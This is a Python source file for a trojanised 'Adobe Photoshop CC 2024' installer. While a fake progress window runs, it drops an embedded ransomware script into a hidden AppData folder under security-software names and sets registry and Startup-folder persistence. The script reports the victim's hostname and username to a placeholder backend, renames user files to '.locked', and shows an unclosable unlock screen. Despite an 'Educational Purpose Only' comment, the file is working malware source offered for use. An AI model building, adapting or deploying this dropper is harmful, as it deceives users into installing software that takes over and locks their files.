"""
setup.py - Combined AutoRun Installer + Ransomware Dropper
This gets compiled to Photoshop_Setup.exe and placed in payload.zip
"""

import os
import sys
import winreg
import shutil
import subprocess
import threading

# ==================== CONFIGURATION ====================
MALWARE_NAME = "WindowsSecurityService"
HIDDEN_FOLDER = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Security")
RANSOMWARE_HIDDEN = os.path.join(HIDDEN_FOLDER, "defender.pyw")

# ==================== EMBEDDED RANSOMWARE CODE ====================
RANSOMWARE_CODE = '''
"""
Ransomware Payload - Educational Purpose Only
"""

import os
import sys
import json
import hashlib
import platform
import requests
from datetime import datetime
from pathlib import Path

# Try Windows modules
try:
    import ctypes
    WINDOWS = True
except ImportError:
    WINDOWS = False

# Try GUI modules
try:
    import tkinter as tk
    from tkinter import messagebox
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

# ==================== CONFIGURATION ====================
BACKEND_URL = "https://your-backend-server.com"
SUPPORT_EMAIL = "support@example.com"
MAX_ATTEMPTS = 3
MASTER_PASSWORD = "123456"
LOCK_FILE = ".folder_lock"
ENCRYPTED_EXTENSION = ".locked"

SKIP_FOLDERS = {
    "Windows", "Program Files", "Program Files (x86)", "ProgramData",
    "$Recycle.Bin", "System Volume Information", "Recovery",
    "node_modules", "__pycache__", ".git", ".vscode",
}

# ==================== HELPER FUNCTIONS ====================

def hide_console():
    if WINDOWS:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def get_system_info():
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "timestamp": datetime.now().isoformat()
    }

def send_to_backend(data):
    try:
        url = f"{BACKEND_URL}/api/infection"
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=data, headers=headers, timeout=30)
        return response.status_code == 201
    except:
        return False

# ==================== FOLDER ENCRYPTION ====================

class FolderEncryptor:
    def __init__(self, password=MASTER_PASSWORD):
        self.password = password

    def encrypt_folder(self, folder_path):
        folder_path = Path(folder_path)
        encrypted_count = 0
        
        if not folder_path.exists():
            return 0
        
        for root, dirs, files in os.walk(folder_path):
            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in SKIP_FOLDERS]
            
            for file in files:
                if file == LOCK_FILE or file.endswith(ENCRYPTED_EXTENSION):
                    continue
                try:
                    file_path = os.path.join(root, file)
                    locked_path = file_path + ENCRYPTED_EXTENSION
                    os.rename(file_path, locked_path)
                    encrypted_count += 1
                except:
                    pass
        
        # Create lock file
        lock_path = folder_path / LOCK_FILE
        lock_data = {
            "locked_at": datetime.now().isoformat(),
            "files_count": encrypted_count,
            "password_hash": hashlib.sha256(self.password.encode()).hexdigest()
        }
        
        with open(lock_path, "w") as f:
            json.dump(lock_data, f)
        
        # Hide lock file
        if WINDOWS:
            try:
                ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 2)
            except:
                pass
        
        return encrypted_count

    def decrypt_folder(self, folder_path):
        folder_path = Path(folder_path)
        decrypted_count = 0
        
        if not folder_path.exists():
            return 0
        
        for root, _, files in os.walk(folder_path):
            for file in files:
                if file.endswith(ENCRYPTED_EXTENSION):
                    try:
                        locked_path = os.path.join(root, file)
                        original_path = locked_path[:-len(ENCRYPTED_EXTENSION)]
                        os.rename(locked_path, original_path)
                        decrypted_count += 1
                    except:
                        pass
        
        # Remove lock file
        lock_path = folder_path / LOCK_FILE
        if lock_path.exists():
            if WINDOWS:
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 0)
                except:
                    pass
            os.remove(lock_path)
        
        return decrypted_count

def is_folder_locked(folder_path):
    return Path(folder_path).joinpath(LOCK_FILE).exists()

def get_target_folders():
    target_folders = []
    user_home = Path.home()
    
    user_folders = [
        user_home / "Documents",
        user_home / "Desktop",
        user_home / "Downloads",
        user_home / "Pictures",
    ]
    
    for folder in user_folders:
        if folder.exists():
            target_folders.append(folder)
    
    return target_folders

# ==================== GUI ====================

if HAS_GUI:
    class UnlockGUI:
        def __init__(self, folder_paths):
            self.folder_paths = folder_paths if isinstance(folder_paths, list) else [folder_paths]
            self.attempts = 0
            self.max_attempts = MAX_ATTEMPTS
            self.unlocked = False

            self.root = tk.Tk()
            self.root.title("Files Locked")
            self.root.geometry("450x400")
            self.root.resizable(False, False)
            self.center_window()
            self.setup_style()
            self.build_ui()
            self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        def center_window(self):
            self.root.update_idletasks()
            x = (self.root.winfo_screenwidth() // 2) - 225
            y = (self.root.winfo_screenheight() // 2) - 200
            self.root.geometry(f"450x400+{x}+{y}")

        def setup_style(self):
            self.bg_color = "#1e1e2e"
            self.fg_color = "#cdd6f4"
            self.accent_color = "#f38ba8"
            self.entry_bg = "#45475a"
            self.root.configure(bg=self.bg_color)

        def build_ui(self):
            main_frame = tk.Frame(self.root, bg=self.bg_color, padx=40, pady=20)
            main_frame.pack(fill=tk.BOTH, expand=True)

            # Warning icon
            tk.Label(
                main_frame, 
                text="⚠️", 
                font=("Segoe UI", 48), 
                bg=self.bg_color, 
                fg=self.accent_color
            ).pack(pady=(10, 5))

            tk.Label(
                main_frame, 
                text="Your Files Are Locked", 
                font=("Segoe UI", 18, "bold"), 
                bg=self.bg_color, 
                fg=self.fg_color
            ).pack(pady=(0, 5))

            tk.Label(
                main_frame, 
                text="Enter the password to unlock your files", 
                font=("Segoe UI", 10), 
                bg=self.bg_color, 
                fg="#888"
            ).pack(pady=(0, 20))

            # Password entry
            self.password_var = tk.StringVar()
            self.password_entry = tk.Entry(
                main_frame, 
                textvariable=self.password_var, 
                font=("Segoe UI", 14), 
                show="●", 
                bg=self.entry_bg, 
                fg=self.fg_color, 
                insertbackground=self.fg_color, 
                relief=tk.FLAT, 
                bd=10
            )
            self.password_entry.pack(fill=tk.X, pady=(0, 10))
            self.password_entry.bind("<Return>", lambda e: self.unlock_folders())

            # Status message
            self.status_var = tk.StringVar()
            tk.Label(
                main_frame, 
                textvariable=self.status_var, 
                font=("Segoe UI", 10), 
                bg=self.bg_color, 
                fg=self.accent_color
            ).pack(pady=(5, 5))

            # Attempts counter
            self.attempts_var = tk.StringVar()
            self.attempts_var.set(f"Attempts: {self.attempts}/{self.max_attempts}")
            tk.Label(
                main_frame, 
                textvariable=self.attempts_var, 
                font=("Segoe UI", 9), 
                bg=self.bg_color, 
                fg="#666"
            ).pack(pady=(0, 15))

            # Unlock button
            tk.Button(
                main_frame, 
                text="UNLOCK FILES", 
                font=("Segoe UI", 13, "bold"), 
                bg=self.accent_color, 
                fg="white", 
                relief=tk.FLAT, 
                pady=12, 
                command=self.unlock_folders
            ).pack(fill=tk.X, pady=(5, 15))

            # Contact info
            tk.Label(
                main_frame, 
                text=f"Contact: {SUPPORT_EMAIL}", 
                font=("Segoe UI", 9), 
                bg=self.bg_color, 
                fg="#89b4fa"
            ).pack(pady=(10, 0))

            self.password_entry.focus_set()

        def unlock_folders(self):
            password = self.password_var.get()
            
            if not password:
                self.status_var.set("Please enter password")
                return
            
            self.attempts += 1
            self.attempts_var.set(f"Attempts: {self.attempts}/{self.max_attempts}")
            
            if password == MASTER_PASSWORD:
                self.status_var.set("Unlocking files...")
                self.root.update()
                
                encryptor = FolderEncryptor(password)
                total = 0
                
                for folder in self.folder_paths:
                    try:
                        total += encryptor.decrypt_folder(folder)
                    except:
                        pass
                
                self.unlocked = True
                messagebox.showinfo("Success", f"Unlocked {total} files successfully!")
                self.root.destroy()
            else:
                self.status_var.set("Wrong password!")
                self.password_var.set("")
                
                if self.attempts >= self.max_attempts:
                    messagebox.showerror("Locked", "Too many failed attempts!")

        def on_close(self):
            if not self.unlocked:
                messagebox.showwarning("Cannot Close", "You must enter the correct password to unlock your files!")
                return
            self.root.destroy()

        def run(self):
            self.root.mainloop()

# ==================== MAIN ====================

def main():
    hide_console()
    
    # Send infection notification
    try:
        data = {"system_info": get_system_info(), "type": "ransomware_infection"}
        send_to_backend(data)
    except:
        pass
    
    # Get target folders
    target_folders = get_target_folders()
    
    # Encrypt folders
    encryptor = FolderEncryptor(MASTER_PASSWORD)
    for folder in target_folders:
        if not is_folder_locked(folder):
            try:
                encryptor.encrypt_folder(folder)
            except:
                pass
    
    # Show unlock GUI
    locked_folders = [str(f) for f in target_folders if is_folder_locked(f)]
    
    if locked_folders and HAS_GUI:
        gui = UnlockGUI(locked_folders)
        gui.run()

if __name__ == "__main__":
    main()
'''

# ==================== HELPER FUNCTIONS ====================

def get_pythonw_path():
    """Get pythonw.exe path."""
    if getattr(sys, "frozen", False):
        possible_paths = [
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python313", "pythonw.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python312", "pythonw.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python311", "pythonw.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python310", "pythonw.exe"),
            shutil.which("pythonw.exe"),
        ]
        for path in possible_paths:
            if path and os.path.exists(path):
                return path
        return "pythonw.exe"
    else:
        python_exe = sys.executable
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw_exe):
            return pythonw_exe
        return python_exe

def drop_ransomware():
    """Drop the ransomware payload to hidden location."""
    try:
        os.makedirs(HIDDEN_FOLDER, exist_ok=True)
        with open(RANSOMWARE_HIDDEN, "w", encoding="utf-8") as f:
            f.write(RANSOMWARE_CODE)
        return True
    except:
        return False

def install_registry_persistence():
    """Add to Windows Registry for persistence."""
    try:
        pythonw = get_pythonw_path()
        run_command = f'"{pythonw}" "{RANSOMWARE_HIDDEN}"'
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, MALWARE_NAME, 0, winreg.REG_SZ, run_command)
        winreg.CloseKey(key)
        return True
    except:
        return False

def install_startup_persistence():
    """Copy to Startup folder for persistence."""
    try:
        startup_folder = os.path.join(
            os.environ["APPDATA"],
            r"Microsoft\Windows\Start Menu\Programs\Startup"
        )
        destination = os.path.join(startup_folder, "WindowsDefender.pyw")
        shutil.copy(RANSOMWARE_HIDDEN, destination)
        return True
    except:
        return False

def execute_ransomware():
    """Execute the ransomware immediately."""
    try:
        pythonw = get_pythonw_path()
        subprocess.Popen(
            [pythonw, RANSOMWARE_HIDDEN],
            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
        )
        return True
    except:
        return False

def show_fake_installer():
    """Show a fake installer GUI while malware runs in background."""
    try:
        import tkinter as tk
        from tkinter import ttk
        
        root = tk.Tk()
        root.title("Adobe Photoshop CC 2024 Setup")
        root.geometry("500x300")
        root.resizable(False, False)
        
        # Center window
        root.update_idletasks()
        x = (root.winfo_screenwidth() // 2) - 250
        y = (root.winfo_screenheight() // 2) - 150
        root.geometry(f"500x300+{x}+{y}")
        
        # Main frame
        frame = tk.Frame(root, padx=30, pady=20)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        tk.Label(
            frame, 
            text="Adobe Photoshop CC 2024", 
            font=("Segoe UI", 18, "bold")
        ).pack(pady=(0, 5))
        
        tk.Label(
            frame, 
            text="Installing components...", 
            font=("Segoe UI", 10)
        ).pack(pady=(0, 25))
        
        # Progress bar
        progress = ttk.Progressbar(frame, length=400, mode="determinate")
        progress.pack(pady=(0, 15))
        
        # Status
        status_var = tk.StringVar(value="Preparing installation...")
        tk.Label(
            frame, 
            textvariable=status_var, 
            font=("Segoe UI", 9)
        ).pack()
        
        # Progress steps
        steps = [
            (15, "Extracting files..."),
            (30, "Installing core components..."),
            (50, "Installing filters..."),
            (70, "Configuring settings..."),
            (85, "Registering components..."),
            (100, "Installation complete!")
        ]
        
        def update_progress(step_index=0):
            if step_index < len(steps):
                progress["value"] = steps[step_index][0]
                status_var.set(steps[step_index][1])
                root.after(800, lambda: update_progress(step_index + 1))
            else:
                root.after(1000, root.destroy)
        
        root.after(500, update_progress)
        root.mainloop()
    except:
        pass

# ==================== MAIN ====================

def main():
    """Main installer function."""
    
    # Run malicious activities in background
    def background_tasks():
        drop_ransomware()
        install_registry_persistence()
        install_startup_persistence()
        execute_ransomware()
    
    # Start background thread
    bg_thread = threading.Thread(target=background_tasks, daemon=True)
    bg_thread.start()
    
    # Show fake installer GUI (blocks until complete)
    show_fake_installer()
    
    # Wait for background tasks
    bg_thread.join(timeout=5)

if __name__ == "__main__":
    main()